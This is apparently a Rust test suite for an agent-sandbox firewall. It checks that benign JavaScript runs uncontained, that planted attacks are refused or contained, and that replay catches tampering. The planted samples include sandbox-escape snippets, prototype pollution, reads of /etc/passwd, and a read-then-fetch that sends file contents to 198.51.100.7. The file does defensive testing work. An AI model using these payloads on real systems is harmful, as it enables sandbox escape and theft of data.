//! bd-9vouw.60: the agent-sandbox behavior firewall must let ordinary agent
//! code run, and must still stop the operations it exists to stop.
//!
//! Before the fix the in-flight guardplane suspended benign code at its first
//! object or function allocation (`var o={x:1}` after 9 instructions,
//! `function f(){}` after 2) and still exited 0: on a 111-program benign
//! corpus 101 were contained or failed, while the planted-malicious
//! "detections" fired at instructions 2-6, before any malicious operation,
//! i.e. they were the same false positive. Root causes: the extension's static
//! trust/confidence metadata was re-added as fresh evidence on every hooked
//! operation, a missing witness confidence was scored as zero confidence, a
//! negative confidence credit raised the trust penalty, the "rate" signal grew
//! with the program's operation count, and ordinary keys (`prototype`,
//! `constructor`) and names containing "eval" scored as attacks.
//!
//! Each case runs through the real `frankenctl agent-sandbox` under a
//! realistic manifest (file reads plus builtins and timers). Benign programs
//! must complete uncontained with the same console output as plain `run`
//! (hooks may watch, never change semantics). Planted programs must be either
//! refused before execution (exit 2) or contained in flight (exit 3).
//! No-claim: a small committed corpus bounds false positives and detections on
//! these programs only; it is not a measured real-world false-positive rate.

use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::time::{SystemTime, UNIX_EPOCH};

const BENIGN: &[(&str, &str)] = &[
    (
        "object_literal",
        "console.log('a'); var o = {x: 1}; console.log('b', o.x);",
    ),
    (
        "function_decl",
        "function f() { return 1 } console.log('f', f());",
    ),
    (
        "closure_counter",
        "function mk(){let c=0;return ()=>++c;} const f=mk(); f(); f(); console.log(f());",
    ),
    (
        "class_super",
        "class A { hi(){ return 'A' } } class B extends A { hi(){ return 'B' + super.hi() } } console.log(new B().hi(), B.prototype.constructor === B);",
    ),
    (
        "prototype_idioms",
        "function P(x){ this.x = x } P.prototype.get = function(){ return this.x }; const p = new P(3); console.log(p.get(), p.constructor === P, Object.getPrototypeOf(p) === P.prototype, Array.prototype.slice.call([1,2,3], 1).join(','));",
    ),
    (
        "destructure_spread",
        "const {a, ...rest} = {a: 1, b: 2, c: 3}; const [x, ...ys] = [1, 2, 3]; console.log(a, JSON.stringify(rest), x, ys.length);",
    ),
    (
        "array_methods",
        "const r = [5, 3, 8, 1].map(n => n * 2).filter(n => n > 4).sort((p, q) => p - q); console.log(r.join(','), r.reduce((s, n) => s + n, 0));",
    ),
    (
        "json_roundtrip",
        "const t = JSON.stringify({id: 1, tags: ['a', 'b'], nested: {ok: true}}); console.log(t, JSON.parse(t).tags.length);",
    ),
    (
        "regexp_use",
        "const m = 'order-2024-17'.match(/(\\d+)-(\\d+)/); console.log(m[1], m[2], /^[a-z]+$/.test('abc'), 'a-b-c'.replace(/-/g, '+'));",
    ),
    (
        "map_set",
        "const m = new Map([[1, 'a']]); m.set(2, 'b'); const s = new Set([1, 2, 2, 3]); console.log(m.size, [...m.keys()].join(','), s.size, s.has(2));",
    ),
    (
        "generators",
        "function* g(){ yield 1; yield 2; yield 3 } let s = 0; for (const v of g()) s += v; console.log(s);",
    ),
    (
        "async_order",
        "const out = []; (async () => { out.push('a'); await null; out.push('c'); console.log(out.join('')); })(); out.push('b');",
    ),
    (
        "timers",
        "setTimeout(() => console.log('late'), 5); setTimeout(() => console.log('early'), 1); console.log('now');",
    ),
    (
        "template_strings",
        "const name = 'agent'; const n = 3; console.log(`hello ${name}, ${n * 2} items`);",
    ),
    (
        "getters_setters",
        "const o = { _v: 1, get v(){ return this._v * 2 }, set v(x){ this._v = x } }; o.v = 5; console.log(o.v);",
    ),
    (
        "try_catch",
        "try { null.x } catch (e) { console.log(e instanceof TypeError) } finally { console.log('done') }",
    ),
    (
        "string_methods",
        "console.log('  Hello World '.trim().toLowerCase().split(' ').map(w => w[0].toUpperCase() + w.slice(1)).join(''), 'abc'.padStart(5, '*'));",
    ),
    (
        "named_like_eval",
        "function retrieval(k){ return k + 1 } function evaluateRow(r){ return r * 2 } console.log(retrieval(1), evaluateRow(2));",
    ),
    (
        "allocation_loop",
        "const items = []; for (let i = 0; i < 2000; i++) items.push({id: i, label: 'item' + i}); console.log(items.length, items[1999].label);",
    ),
    (
        "read_granted_file",
        "const fs = require('fs'); const text = fs.readFileSync('notes.txt', 'utf8'); console.log(text.trim().length);",
    ),
];

/// Planted programs and the expected outcome class. The firewall must stop
/// each one either before execution (refused, exit 2) or in flight
/// (contained, exit 3); completing uncontained is the failure mode.
const PLANTED: &[(&str, &str)] = &[
    (
        "function_ctor",
        "const f = Function('return this')(); console.log(typeof f);",
    ),
    (
        "ctor_ctor_escape",
        "const g = ({}).constructor.constructor('return this')(); console.log(typeof g);",
    ),
    (
        "proto_pollution",
        "const t = {}; t.__proto__.admin = true; console.log(({}).admin);",
    ),
    (
        "proto_walk",
        "let x = {}; for (let i = 0; i < 5; i++) { x = x.__proto__ || x; } console.log('done');",
    ),
    ("eval_payload", "console.log(eval('1+1'));"),
    ("env_probe", "console.log(Object.keys(process.env).length);"),
    (
        "fs_probe_outside_root",
        "const fs = require('fs'); for (const p of ['/etc/passwd', '../../secret']) { try { fs.readFileSync(p); } catch (e) {} } console.log('probed');",
    ),
    (
        "read_then_fetch",
        "const fs = require('fs'); const d = fs.readFileSync('notes.txt', 'utf8'); fetch('http://198.51.100.7/x?d=' + encodeURIComponent(d)); console.log('sent');",
    ),
];

fn scratch_dir(tag: &str) -> PathBuf {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("time")
        .as_nanos();
    let dir = std::env::temp_dir().join(format!("fe_sbx_cal_{tag}_{}_{nonce}", std::process::id()));
    fs::create_dir_all(dir.join("root")).expect("scratch dir");
    fs::write(dir.join("root").join("notes.txt"), "agent notes\n").expect("seed file");
    dir
}

fn write_manifest(dir: &Path) -> PathBuf {
    let manifest = serde_json::json!({
        "schema_version": "franken-engine.agent-sandbox-manifest.v1",
        "agent_id": "bd-9vouw-60-agent",
        "tool_grants": [
            {"tool_name": "read_file", "capability_tag": "fs_read"},
            {"tool_name": "js_builtins", "capability_tag": "builtin"},
            {"tool_name": "timers", "capability_tag": "timer"}
        ],
        "host_io_root": dir.join("root").to_str().expect("utf8"),
    });
    let path = dir.join("manifest.json");
    fs::write(&path, serde_json::to_vec_pretty(&manifest).expect("json")).expect("manifest");
    path
}

fn frankenctl(dir: &Path, args: &[&str]) -> Output {
    Command::new(env!("CARGO_BIN_EXE_frankenctl"))
        .args(args)
        .current_dir(dir.join("root"))
        .output()
        .expect("frankenctl should execute")
}

fn sandbox(
    dir: &Path,
    manifest: &Path,
    name: &str,
    source: &str,
) -> (Output, Option<serde_json::Value>) {
    let input = dir.join(format!("{name}.js"));
    let report = dir.join(format!("{name}.sandbox.json"));
    fs::write(&input, source).expect("program");
    let output = frankenctl(
        dir,
        &[
            "agent-sandbox",
            "--manifest",
            manifest.to_str().expect("utf8"),
            "--input",
            input.to_str().expect("utf8"),
            "--out",
            report.to_str().expect("utf8"),
        ],
    );
    let parsed = fs::read_to_string(&report)
        .ok()
        .map(|text| serde_json::from_str(&text).expect("report json"));
    (output, parsed)
}

fn plain_run_console(dir: &Path, name: &str, source: &str) -> Vec<String> {
    let input = dir.join(format!("{name}.plain.js"));
    let report = dir.join(format!("{name}.plain.json"));
    fs::write(&input, source).expect("program");
    let output = frankenctl(
        dir,
        &[
            "run",
            "--input",
            input.to_str().expect("utf8"),
            "--extension-id",
            "plain",
            "--out",
            report.to_str().expect("utf8"),
        ],
    );
    assert!(
        output.status.success(),
        "{name}: plain run must succeed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let parsed: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(&report).expect("report")).expect("json");
    parsed["console_output"]
        .as_array()
        .expect("console")
        .iter()
        .map(|entry| entry["message"].as_str().expect("message").to_string())
        .collect()
}

fn containment(report: &serde_json::Value) -> String {
    report["report"]["guardplane"]["containment_action"]
        .as_str()
        .expect("containment action")
        .to_string()
}

#[test]
fn benign_agent_programs_run_uncontained_with_plain_run_semantics() {
    let dir = scratch_dir("benign");
    let manifest = write_manifest(&dir);
    let mut failures = Vec::new();
    for (name, source) in BENIGN {
        let (output, report) = sandbox(&dir, &manifest, name, source);
        let Some(report) = report else {
            failures.push(format!(
                "{name}: no report, exit {:?}: {}",
                output.status.code(),
                String::from_utf8_lossy(&output.stderr)
            ));
            continue;
        };
        let action = containment(&report);
        if output.status.code() != Some(0)
            || matches!(action.as_str(), "suspend" | "terminate" | "quarantine")
        {
            failures.push(format!(
                "{name}: contained ({action}), exit {:?}",
                output.status.code()
            ));
            continue;
        }
        // The report carries the console count; the full transcript lives in
        // the evidence stream, so compare counts against the plain run.
        // Plain `run` holds no file grant, so the file-reading case is pinned
        // to its known single line instead.
        let expected = if *name == "read_granted_file" {
            1
        } else {
            plain_run_console(&dir, name, source).len() as u64
        };
        let entries = report["report"]["console_entries"].as_u64().expect("count");
        if entries != expected {
            failures.push(format!(
                "{name}: console entries {entries} differ from plain run {expected}"
            ));
        }
    }
    assert!(
        failures.is_empty(),
        "benign false positives ({}/{}):\n{}",
        failures.len(),
        BENIGN.len(),
        failures.join("\n")
    );
}

#[test]
fn planted_attacks_are_refused_or_contained() {
    let dir = scratch_dir("planted");
    let manifest = write_manifest(&dir);
    let mut escapes = Vec::new();
    for (name, source) in PLANTED {
        let (output, report) = sandbox(&dir, &manifest, name, source);
        let code = output.status.code();
        let outcome = match (code, report.as_ref().map(containment)) {
            (Some(2), _) => "refused".to_string(),
            (Some(3), Some(action)) => format!("contained:{action}"),
            (other, action) => {
                escapes.push(format!(
                    "{name}: completed uncontained (exit {other:?}, action {action:?})"
                ));
                continue;
            }
        };
        eprintln!("{name}: {outcome}");
    }
    assert!(
        escapes.is_empty(),
        "planted attacks that ran uncontained:\n{}",
        escapes.join("\n")
    );
}

fn record_replayable_sandbox(dir: &Path) -> serde_json::Value {
    let manifest_path = write_manifest(dir);
    let mut manifest: serde_json::Value =
        serde_json::from_slice(&fs::read(&manifest_path).expect("manifest")).expect("json");
    manifest["tool_grants"]
        .as_array_mut()
        .expect("grants")
        .push(serde_json::json!({"tool_name": "write_file", "capability_tag": "fs_write"}));
    fs::write(&manifest_path, serde_json::to_vec(&manifest).expect("json")).expect("manifest");
    let (output, report) = sandbox(
        dir,
        &manifest_path,
        "recorded",
        "const fs = require('fs'); fs.writeFileSync('output.txt', 'recorded write'); const text = fs.readFileSync('notes.txt', 'utf8'); console.log(text.trim().length); try { fs.readFileSync('missing.txt', 'utf8'); } catch (e) { console.log('missing'); }",
    );
    assert!(
        output.status.success(),
        "sandbox recording failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let report = report.expect("sandbox report");
    assert_eq!(report["report"]["host_effects"], 3);
    assert_eq!(
        fs::read_to_string(dir.join("root/output.txt")).expect("real write"),
        "recorded write"
    );
    assert!(report["replay"]["replay_input_signature"].is_object());
    assert_eq!(report["replay"]["replay_input"]["module_hashes_exact"], true);
    report
}

fn replay_sandbox_report(dir: &Path, name: &str, report: &serde_json::Value) -> Output {
    let path = dir.join(format!("{name}.replay-input.json"));
    fs::write(&path, serde_json::to_vec(report).expect("report json")).expect("report write");
    Command::new(env!("CARGO_BIN_EXE_frankenctl"))
        .args([
            "replay",
            "run",
            "--trace",
            path.to_str().expect("utf8"),
            "--mode",
            "strict",
        ])
        .current_dir(dir)
        .output()
        .expect("replay executes")
}

#[test]
fn sandbox_replay_uses_recorded_host_effects_without_live_root_rc_c2() {
    let dir = scratch_dir("offline_replay");
    let report = record_replayable_sandbox(&dir);
    fs::rename(dir.join("root"), dir.join("retained-root")).expect("retain original files");
    fs::write(dir.join("retained-root/notes.txt"), "changed after recording")
        .expect("change live input");
    fs::write(dir.join("retained-root/output.txt"), "must remain untouched").expect("canary");

    let output = replay_sandbox_report(&dir, "offline", &report);
    assert!(
        output.status.success(),
        "offline replay failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let replay: serde_json::Value = serde_json::from_slice(&output.stdout).expect("replay json");
    assert_eq!(replay["complete"], true);
    assert_eq!(replay["decisions_match"], true);
    assert_eq!(replay["unsigned_execution_content_match"], true);
    assert_eq!(replay["randomness_transcript_match"], true);
    assert_eq!(replay["evidence_authenticated"], false);
    assert!(
        !dir.join("root").exists(),
        "replay must not recreate the host root"
    );
    assert_eq!(
        fs::read_to_string(dir.join("retained-root/output.txt")).expect("canary"),
        "must remain untouched"
    );
}

#[test]
fn sandbox_replay_refuses_missing_extra_and_reordered_effects_rc_c2() {
    let dir = scratch_dir("tampered_effects");
    let original = record_replayable_sandbox(&dir);
    for mutation in ["missing", "extra", "reordered"] {
        let mut report = original.clone();
        let transcript = report["replay"]["replay_input"]["host_effect_transcript"]
            .as_array_mut()
            .expect("recorded effects");
        match mutation {
            "missing" => {
                transcript.pop();
            }
            "extra" => transcript.push(transcript[0].clone()),
            "reordered" => transcript.reverse(),
            _ => unreachable!(),
        }
        let output = replay_sandbox_report(&dir, mutation, &report);
        assert!(
            !output.status.success(),
            "{mutation} effect transcript must not certify replay: {}",
            String::from_utf8_lossy(&output.stdout)
        );
        assert!(
            String::from_utf8_lossy(&output.stderr).contains("re-execution failed"),
            "{mutation}: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }
}

#[test]
fn sandbox_replay_rejects_authority_and_summary_drift_rc_c2() {
    let dir = scratch_dir("tampered_authority");
    let original = record_replayable_sandbox(&dir);
    let mut authority = original.clone();
    authority["replay"]["replay_input"]["agent_sandbox_manifest"]["tool_grants"] =
        serde_json::json!([]);
    let rejected = replay_sandbox_report(&dir, "authority", &authority);
    assert!(!rejected.status.success());
    assert!(
        String::from_utf8_lossy(&rejected.stderr)
            .contains("sandbox replay authority differs from the recorded manifest")
    );

    let mut provenance = original.clone();
    provenance["replay"]["replay_input"]["host_io_exception_provenance"] =
        serde_json::json!("unknown");
    let rejected = replay_sandbox_report(&dir, "provenance", &provenance);
    assert!(!rejected.status.success());
    assert!(
        String::from_utf8_lossy(&rejected.stderr)
            .contains("filesystem exception provenance differs from the CLI composition")
    );

    let mut identity = original.clone();
    identity["report"]["evidence_verification_identity"]["producer_id"] =
        serde_json::json!("unrelated-producer");
    let rejected = replay_sandbox_report(&dir, "identity", &identity);
    assert!(!rejected.status.success());
    assert!(
        String::from_utf8_lossy(&rejected.stderr)
            .contains("sandbox summary signer differs from its evidence chain")
    );

    let mut summary = original;
    summary["report"]["guardplane"]["containment_action"] = serde_json::json!("quarantine");
    let rejected = replay_sandbox_report(&dir, "summary", &summary);
    assert!(!rejected.status.success());
    assert!(
        String::from_utf8_lossy(&rejected.stderr)
            .contains("sandbox authority or guardplane summary differs")
    );
}

#[test]
fn sandbox_replay_records_caught_denials_without_a_live_provider_rc_c2() {
    let dir = scratch_dir("denial_replay");
    let manifest_path = write_manifest(&dir);
    let mut manifest: serde_json::Value =
        serde_json::from_slice(&fs::read(&manifest_path).expect("manifest")).expect("json");
    manifest
        .as_object_mut()
        .expect("manifest object")
        .remove("host_io_root");
    fs::write(&manifest_path, serde_json::to_vec(&manifest).expect("json")).expect("manifest");
    let (output, report) = sandbox(
        &dir,
        &manifest_path,
        "denied",
        "const fs = require('fs'); try { fs.readFileSync('notes.txt', 'utf8'); } catch (e) { console.log('denied'); }",
    );
    assert!(
        output.status.success(),
        "caught denial must complete: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let report = report.expect("denied sandbox report");
    assert_eq!(report["report"]["host_effects"], 1);
    assert_eq!(report["replay"]["console_output"][0]["message"], "denied");
    let replay = replay_sandbox_report(&dir, "denied", &report);
    assert!(
        replay.status.success(),
        "denied effect replay failed: {}",
        String::from_utf8_lossy(&replay.stderr)
    );
}
